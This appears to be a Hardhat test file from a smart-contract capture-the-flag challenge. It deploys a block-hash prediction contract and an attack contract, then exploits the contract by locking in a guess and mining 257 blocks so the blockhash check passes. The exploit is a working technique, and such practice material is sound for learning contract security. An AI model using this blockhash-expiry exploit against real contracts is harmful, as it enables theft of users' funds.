const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Predict Future Block-hash Contract', function () {

    let deployer, player,attacker;
    let baseContract, attackContract;


    before(async function () {
        /** SETUP SCENARIO */
        [deployer, player, attacker] = await ethers.getSigners();
        this.amount = 1000000;
        const baseContractFactory = await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer);
        const attackContractFactory = await ethers.getContractFactory('AttackPredictTheBlockHash', attacker);
        const payment = hre.ethers.utils.parseEther('1');
        baseContract = await baseContractFactory.deploy({value: payment});
        attackContract = await attackContractFactory.deploy(baseContract.address);
        await baseContract.deployed();
        await attackContract.deployed();
        expect(
            await baseContract.isComplete()
        ).to.equal(false);
    });

    it('Exploit Future Block-hash Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const payment = hre.ethers.utils.parseEther('1');
        const guess = await attackContract.connect(attacker).returnGuess();
        await baseContract.connect(attacker).lockInGuess(guess,{value: payment, gasLimit: 100000,});
        await mineNBlocks(257);
        await baseContract.connect(attacker).settle();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await baseContract.isComplete()
        ).to.be.equal(true);


    });
});

async function mineNBlocks(n) {
    for (let index = 0; index < n; index++) {
        await hre.ethers.provider.send('evm_mine');
    }
}